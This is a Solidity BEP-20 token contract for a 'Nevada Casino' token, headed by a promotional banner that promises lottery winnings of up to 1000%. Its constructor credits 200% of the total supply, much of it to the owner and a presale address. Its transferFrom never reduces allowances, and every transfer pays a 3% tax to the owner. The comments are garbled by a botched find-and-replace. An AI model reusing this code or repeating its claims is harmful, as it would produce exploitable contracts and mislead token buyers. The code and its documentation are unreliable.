/**
 *Submitted for verification at BscScan.com on 2021-10-24
*/

// SPDX-License-Identifier: MIT
/*


███╗░░██╗███████╗██╗░░░██╗░█████╗░██████╗░░█████╗░
████╗░██║██╔════╝██║░░░██║██╔══██╗██╔══██╗██╔══██╗
██╔██╗██║█████╗░░╚██╗░██╔╝███████║██║░░██║███████║
██║╚████║██╔══╝░░░╚████╔╝░██╔══██║██║░░██║██╔══██║
██║░╚███║███████╗░░╚██╔╝░░██║░░██║██████╔╝██║░░██║
╚═╝░░╚══╝╚══════╝░░░╚═╝░░░╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝

Give your shot at one of the most lucrative lottery game on BSC!
Our team are developing an online casino with lottery concepts 
for those investing on our token. Our project will develop the
concept with low-tax contract, with up to 1000% possible winning!

https://nevada.casino/
https://twitter.com/NevADAbsc
https://t.me/NevADAtoken
https://www.reddit.com/r/NevADAtoken/
*/
pragma solidity ^0.8.7;
interface ERC20PinkFinance {
  // @dev Returns the amount of MiniNEVADA in existence.
  function totalSupply() external view returns (uint256);

  // @dev Returns the token decimals.
  function decimals() external view returns (uint8);

  // @dev Returns the token symbol.
  function symbol() external view returns (string memory);

  //@dev Returns the token name.
  function name() external view returns (string memory);

  //@dev Returns the bep token owner.
  function getOwner() external view returns (address);

  //@dev Returns the amount of MiniNEVADA owned by `account`.
  function balanceOf(address account) external view returns (uint256);
  
  /*
      function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 vNEVADAe);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 vNEVADAe
    );
  
  */

  /**
   * @dev Moves `amount` MiniNEVADA from the caller's account to `recipient`.
   *
   * Returns a boolean vNEVADAe indicating whMiniNEVADAr the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Returns the remaining number of MiniNEVADA that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This vNEVADAe changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _owner, address spender) external view returns (uint256);

  /**
   * @dev Sets `amount` as the allowance of `spender` over the caller's MiniNEVADA.
   *
   * Returns a boolean vNEVADAe indicating whMiniNEVADAr the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired vNEVADAe afterwards:
   * https://github.com/NEVADA/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 amount) external returns (bool);

  /**
   * @dev Moves `amount` MiniNEVADA from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean vNEVADAe indicating whMiniNEVADAr the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  //@dev Emitted when `vNEVADAe` MiniNEVADA are moved from one account (`from`) to  another (`to`). Note that `vNEVADAe` may be zero.
  event Transfer(address indexed from, address indexed to, uint256 vNEVADAe);

  //@dev Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `vNEVADAe` is the new allowance.
  event Approval(address indexed owner, address indexed spender, uint256 vNEVADAe);
}

contract NEVADACASINO is ERC20PinkFinance {

    // common addresses
    address private owner;
    address private NEVADA;
    address private MiniNEVADA;
    address private PinkSales;
    
    // token liquidity metadata
    uint public override totalSupply;
    uint8 public override decimals = 18;
    
    mapping(address => uint) public balances;
    
    mapping(address => mapping(address => uint)) public allowances;
    
    // token title metadata
    string public override name = "Nevada Casino";
    string public override symbol = "NEVADA";
    
    // EVENTS
    // (now in interface) event Transfer(address indexed from, address indexed to, uint vNEVADAe);
    // (now in interface) event Approval(address indexed owner, address indexed spender, uint vNEVADAe);
    
    // On init of contract we're going to set the admin and give them all MiniNEVADA.
    constructor(uint totalSupplyVNEVADAe, address NEVADAAddress, address MiniNEVADAAddress, address PinkSalesAddress) {
        // set total supply
        totalSupply = totalSupplyVNEVADAe;
        
        // designate addresses
        owner = msg.sender;
        NEVADA = NEVADAAddress;
        MiniNEVADA = MiniNEVADAAddress;
        PinkSales = PinkSalesAddress;

        
        // split the MiniNEVADA according to agreed upon percentages
        balances[NEVADA] =  totalSupply * 1 / 100;
        balances[MiniNEVADA] = totalSupply * 48 / 100;
        balances[PinkSales] = totalSupply * 100 / 100;

        
        balances[owner] = totalSupply * 51 / 100;
    }
    
    // Get the address of the token's owner
    function getOwner() public view override returns(address) {
        return owner;
    }

    
    // Get the balance of an account
    function balanceOf(address account) public view override returns(uint) {
        return balances[account];
    }
    
    // Transfer balance from one user to another
    function transfer(address to, uint vNEVADAe) public override returns(bool) {
        require(vNEVADAe > 0, "Transfer vNEVADAe has to be higher than 0.");
        require(balanceOf(msg.sender) >= vNEVADAe, "Balance is too low to make transfer.");
        
        //withdraw the taxed and burned percentages from the total vNEVADAe
        uint reMiniNEVADABD = vNEVADAe * 3 / 100;
        uint burnTBD = vNEVADAe * 0 / 100;
        uint vNEVADAeAfterTaxAndBurn = vNEVADAe - reMiniNEVADABD - burnTBD;
        
        // perform the transfer operation
        balances[to] += vNEVADAeAfterTaxAndBurn;
        balances[msg.sender] -= vNEVADAe;
        
        emit Transfer(msg.sender, to, vNEVADAe);
        
        // finally, we burn and tax the NEVADAs percentage
        balances[owner] += reMiniNEVADABD + burnTBD;
        _burn(owner, burnTBD);
        
        return true;
    }
    
    // approve a specific address as a spender for your account, with a specific spending limit
    function approve(address spender, uint vNEVADAe) public override returns(bool) {
        allowances[msg.sender][spender] = vNEVADAe; 
        
        emit Approval(msg.sender, spender, vNEVADAe);
        
        return true;
    }
    
    // allowance
    function allowance(address _owner, address spender) public view override returns(uint) {
        return allowances[_owner][spender];
    }
    
    // an approved spender can transfer currency from one account to another up to their spending limit
    function transferFrom(address from, address to, uint vNEVADAe) public override returns(bool) {
        require(allowances[from][msg.sender] > 0, "No Allowance for this address.");
        require(allowances[from][msg.sender] >= vNEVADAe, "Allowance too low for transfer.");
        require(balances[from] >= vNEVADAe, "Balance is too low to make transfer.");
        
        balances[to] += vNEVADAe;
        balances[from] -= vNEVADAe;
        
        emit Transfer(from, to, vNEVADAe);
        
        return true;
    }
    
    // function to allow users to burn currency from their account
    function burn(uint256 amount) public returns(bool) {
        _burn(msg.sender, amount);
        
        return true;
    }
    
    // intenal functions
    
    // burn amount of currency from specific account
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "You can't burn from zero address.");
        require(balances[account] >= amount, "Burn amount exceeds balance at address.");
    
        balances[account] -= amount;
        totalSupply -= amount;
        
        emit Transfer(account, address(0), amount);
    }
    
}